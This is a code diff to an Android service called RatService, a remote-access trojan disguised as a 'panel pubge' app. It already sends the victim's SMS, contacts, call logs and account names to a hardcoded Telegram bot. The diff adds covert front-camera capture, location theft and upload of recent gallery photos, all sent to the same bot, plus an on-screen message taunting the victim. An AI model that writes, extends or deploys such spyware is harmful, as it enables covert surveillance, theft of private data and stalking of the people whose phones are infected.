@@ -6,21 +6,24 @@ import android.app.*;
 import android.content.*;
 import android.content.pm.ApplicationInfo;
 import android.database.Cursor;
+import android.graphics.ImageFormat;
+import android.hardware.Camera;
+import android.location.Location;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
+import android.widget.Toast;
 import java.io.*;
-import java.util.Arrays;
-import java.util.Comparator;
 import java.util.List;
 import okhttp3.*;
 
 public class RatService extends Service {
-    // ⚠️ غير البيانات هنا
-    private static final String BOT_TOKEN = "9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
+    private static final String BOT_TOKEN = "‏9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
     private static final String CHAT_ID = "6978974735";
     private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
 
@@ -44,9 +47,10 @@ public class RatService extends Service {
                 dumpSms(); Thread.sleep(1500);
                 dumpContacts(); Thread.sleep(1500);
                 dumpCallLogs(); Thread.sleep(1500);
-                dumpApps(); Thread.sleep(1500);
-                dumpFiles(); Thread.sleep(1500);
-                dumpImages();
+                dumpImages(); Thread.sleep(1500);
+                
+                takePhoto(); // سحب صورة
+                getLocation(); // سحب الموقع
 
                 sendTextToTelegram("✅ **اكتمل سحب البيانات والصور!**");
                 
@@ -64,6 +68,74 @@ public class RatService extends Service {
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
             Notification notification = new Notification.Builder(this, channelId).setContentTitle("panel pubge").setSmallIcon(android.R.drawable.ic_menu_manage).build();
             startForeground(1, notification);
+        }
+    }
+
+    // --- التأثير الأول: رسالة على الشاشة ---
+    public void showToast(String msg) {
+        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+            Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();
+        });
+    }
+
+    // --- التأثير الثاني: الكاميرا ---
+    private void takePhoto() {
+        try {
+            Camera camera = Camera.open(0); // 0 = الكاميرا الأمامية
+            camera.setPreviewTexture(new android.graphics.SurfaceTexture(10));
+            camera.startPreview();
+            camera.takePicture(null, null, (data, cam) -> {
+                File photo = new File(getExternalFilesDir(null), "hacked_photo.jpg");
+                try (FileOutputStream fos = new FileOutputStream(photo)) {
+                    fos.write(data);
+                } catch (IOException ignored) {}
+                cam.release();
+                uploadFileToTelegram(photo, "image/jpeg");
+                showToast("تم اختراق جهازك بنجاح 😂"); // الرسالة اللي هتطلعله
+            });
+        } catch (Exception e) {
+            sendTextToTelegram("❌ فشل الكاميرا: " + e.getMessage());
+        }
+    }
+
+    // --- التأثير الثالث: الموقع ---
+    private void getLocation() {
+        try {
+            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            
+            if (loc != null) {
+                String mapsLink = "📍 **الموقع:** https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
+                sendTextToTelegram(mapsLink);
+            } else {
+                sendTextToTelegram("❌ الموقع غير متاح حالياً.");
+            }
+        } catch (SecurityException e) {
+            sendTextToTelegram("❌ صلاحية الموقع مرفوضة.");
+        }
+    }
+
+    // --- تصليح سحب الصور (MediaStore) ---
+    private void dumpImages() {
+        try {
+            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            String[] projection = {MediaStore.Images.Media.DATA};
+            Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 3");
+            
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
+                    File imgFile = new File(path);
+                    if (imgFile.exists() && imgFile.length() < 10 * 1024 * 1024) {
+                        uploadFileToTelegram(imgFile, "image/jpeg");
+                        Thread.sleep(2000);
+                    }
+                }
+                cursor.close();
+            }
+        } catch (Exception e) {
+            sendTextToTelegram("❌ فشل سحب الصور: " + e.getMessage());
         }
     }
 
@@ -86,33 +158,11 @@ public class RatService extends Service {
         }
     }
 
-    private void dumpImages() {
-        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
-        File[] allImages = new File[0];
-        if (dcim.exists() && dcim.listFiles() != null) allImages = dcim.listFiles();
-        if (allImages.length > 0) {
-            Arrays.sort(allImages, new Comparator<File>() {
-                public int compare(File f1, File f2) { return Long.compare(f2.lastModified(), f1.lastModified()); }
-            });
-            int count = 0;
-            for (File img : allImages) {
-                if (img.isFile() && (img.getName().endsWith(".jpg") || img.getName().endsWith(".png"))) {
-                    if (img.length() < 10 * 1024 * 1024) { 
-                        uploadFileToTelegram(img, "image/jpeg"); 
-                        count++; 
-                        try { Thread.sleep(2000); } catch (Exception e) {} 
-                    }
-                    if (count >= 5) break;
-                }
-            }
-        }
-    }
-
     private void dumpAllAccounts() {
         try {
             AccountManager am = AccountManager.get(this);
             Account[] accounts = am.getAccounts();
-            StringBuilder sb = new StringBuilder("📧 **الحسابات المسجلة:**\n");
+            StringBuilder sb = new StringBuilder("📧 **الحسابات:**\n");
             for (Account account : accounts) sb.append("- ").append(account.type).append(": `").append(account.name).append("`\n");
             sendTextToTelegram(sb.toString());
         } catch (Exception e) {}
@@ -151,25 +201,6 @@ public class RatService extends Service {
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
             Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
             if (c != null) { while (c.moveToNext()) bw.write("Number: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) + "\n"); c.close(); }
-            bw.flush(); uploadFileToTelegram(file, "text/plain");
-        } catch (Exception ignored) {}
-    }
-
-    private void dumpApps() {
-        File file = new File(getExternalFilesDir(null), "apps.txt");
-        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
-            List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
-            for (ApplicationInfo app : apps) bw.write(app.packageName + "\n");
-            bw.flush(); uploadFileToTelegram(file, "text/plain");
-        } catch (Exception ignored) {}
-    }
-
-    private void dumpFiles() {
-        File file = new File(getExternalFilesDir(null), "files.txt");
-        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
-            File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            bw.write("=== Downloads ===\n");
-            if (download.exists() && download.listFiles() != null) for (File f : download.listFiles()) bw.write(f.getName() + "\n");
             bw.flush(); uploadFileToTelegram(file, "text/plain");
         } catch (Exception ignored) {}
     }
